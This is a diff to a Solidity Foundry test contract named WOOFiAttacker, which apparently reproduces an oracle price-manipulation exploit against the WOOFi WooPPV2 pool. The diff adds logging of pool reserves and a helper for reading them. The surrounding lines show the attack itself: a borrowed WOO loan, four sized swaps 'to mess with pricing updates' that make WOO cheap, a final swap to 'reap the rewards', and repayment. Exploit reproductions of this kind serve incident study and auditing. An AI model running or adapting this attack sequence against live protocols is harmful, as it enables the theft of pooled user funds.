@@ -83,11 +83,14 @@ contract WOOFiAttacker is Test {
         console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
         console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
         console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
+        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
+        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
         console.log("");
 
         // 4 consecutive swaps (to mess with pricing updates):
         // Sets up the WOO to be cheap
-        // 1. USDC -> WETH to update the USDC oracle
+        // 1. USDC -> WETH
         IERC20(USDC).transfer(address(WOOPPV2), 2000000000000);
         WOOPPV2.swap(USDC, WETH, 2000000000000, 0, address(this), address(this));
         console.log("Oracle prices after swapping USDC -> WETH:");
@@ -97,6 +100,9 @@ contract WOOFiAttacker is Test {
         console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
         console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
         console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
+        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
+        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
         console.log("");
         // 2. USDC -> WOO 
         IERC20(USDC).transfer(address(WOOPPV2), 100000000000);
@@ -108,6 +114,9 @@ contract WOOFiAttacker is Test {
         console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
         console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
         console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
+        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
+        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
         console.log("");
         // 3. WOO -> USDC
         IERC20(WOO).transfer(address(WOOPPV2), 7856868800000000000000000);
@@ -119,6 +128,9 @@ contract WOOFiAttacker is Test {
         console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
         console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
         console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
+        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
+        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
         console.log("");
         // 4. USDC -> WOO // reap the rewards
         IERC20(USDC).transfer(address(WOOPPV2), 926342);
@@ -130,6 +142,9 @@ contract WOOFiAttacker is Test {
         console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
         console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
         console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
+        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
+        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
         console.log("");
         // repay WOO loan, receive USDC
         SILO.repay(WOO, max);
@@ -193,6 +208,11 @@ contract WOOFiAttacker is Test {
     function _getPrice(address asset) internal view returns (uint256) {
         (uint256 priceNow, bool feasible) = WOOORACLEV2.price(asset);
         return priceNow;
+    }
+
+    function _getTokenInfo(address token) internal view returns (uint192) {
+        IWooPPV2.TokenInfo memory tokenInfo = WOOPPV2.tokenInfos(token);
+        return tokenInfo.reserve;
     }
     
 }
